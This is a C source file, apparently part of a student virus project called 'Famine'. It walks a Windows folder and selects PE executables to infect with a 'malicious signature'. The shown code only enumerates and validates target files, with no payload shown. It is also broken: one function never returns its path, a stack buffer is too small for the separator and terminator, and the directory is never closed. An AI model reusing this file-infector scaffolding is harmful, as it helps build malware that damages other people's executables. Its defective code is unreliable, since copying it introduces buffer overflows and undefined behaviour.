/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   infection.c                                        :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: frmarinh <frmarinh@student.42.fr>          +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2017/07/04 18:05:22 by frmarinh          #+#    #+#             */
/*   Updated: 2017/07/04 18:07:34 by frmarinh         ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "all.h"

/*
**	Get the entire temporary path with the folder name
*/
static char*		get_complete_path(t_famine *famine, char *folder_name)
{
	char		*target;

	if (!(target = ft_strnew(ft_strlen(famine->path) + ft_strlen(folder_name))))
		return (NULL);
	ft_strcat(target, famine->path);
	ft_strcat(target, "\\");
	ft_strcat(target, folder_name);
}

/*
** Check the validity of the current file (PE executable format and access)
*/
static bool			check_file_validity(t_famine *famine, char *target_path, char *file_name)
{
	char		file_path[ft_strlen(target_path) + ft_strlen(file_name)];
	struct stat	*file_stat = NULL;

	ft_memset(file_path, 0, ft_strlen(target_path) + ft_strlen(file_name));
	ft_strcat(file_path, target_path);
	ft_strcat(file_path, "\\");
	ft_strcat(file_path, file_name);
	if (!(file_stat = check_access_file(file_path, famine)))
		return (false);
	free(file_stat);
	return (true);
}

/*
**	Infecting the folder with malicious signature
*/
void				infect_folder(t_famine *famine, char *folder_name)
{
	char			*target_path	= get_complete_path(famine, folder_name);
	DIR				*directory		= NULL;
	struct dirent	*file			= NULL;
	t_pe			*pe_file		= NULL;

	if (!(directory = opendir(target_path))) {
		print_message(famine, strerror(errno), false);
		return;
	}
	while ((file = readdir(directory)) != NULL) {
		if (check_file_validity(famine, target_path, file->d_name)) {
			if ((pe_file = pe(famine, target_path, file->d_name, false)) == NULL) {
				printf("The file %s is not a valid PE file, sorry :(\n", file->d_name);
			}
		}
	}
}
